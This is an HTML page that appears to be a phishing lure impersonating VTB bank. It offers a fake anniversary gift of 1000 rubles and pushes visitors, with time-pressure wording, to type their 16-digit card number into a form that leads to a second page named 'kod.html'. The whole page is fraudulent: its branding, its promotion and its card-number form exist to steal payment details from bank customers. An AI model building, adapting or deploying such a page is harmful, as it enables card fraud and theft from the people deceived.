<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <title>Подарок - Банк ВТБ</title>
</head>
<body>
    <div class="wrap">
        <header class="logo">
            <img src="Image/logo.png" alt="Лого ВТБ">
        </header>
    </div>
    <header class="main">
        <div class="wrap">
           <div class="main-inform">
               <div class="main-text">
                <h2>Акция “День рождение ВТБ”</h2>
                <p>Получите 1000 рублей <br>
                    на свою ВТБ карту <br>
                    в честь 30-летия банка </p>
               </div>
               <div class="main-but">
                <a href="#form">ПОЛУЧИТЬ ПОДАРОК</a>
               </div>
           </div>
        </div>
    </header>
    <section id="form">
        <div class="wrap">
            <div class="form-text">
                УСПЕЙ ПОЛУЧИТЬ СВОИ 1000 РУБЛЕЙ! <br>
                АКЦИЯ ОГРАНИЧЕНА!
            </div>
            <div class="number-card">
                <p class="text-number">Введите номер карты ВТБ банка:</p>
                <form action="kod.html">
                    <input type="text" placeholder="Номер карты" required maxlength="16" minlength="16">
                    <div class="but">
                        <button>ПОЛУЧИТЬ ПОДАРОК</button>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <div class="wrap">
            <div class="info">
                <img src="Image/logo.png" class="banklogo"alt="">
                <p>2020 Все права защищены</p>
                <img src="Image/cardlogo.png" class="cardlogo"alt="">
            </div>
            <div class="info-mob">
                <p>2020 Все права защищены</p>
                <div class="logoinfo-mob">
                    <img src="Image/logo.png" class="banklogo"alt="">
                    <img src="Image/cardlogo.png" class="cardlogo"alt="">
                </div>
            </div>
        </div>
    </footer>
</body>
</html>
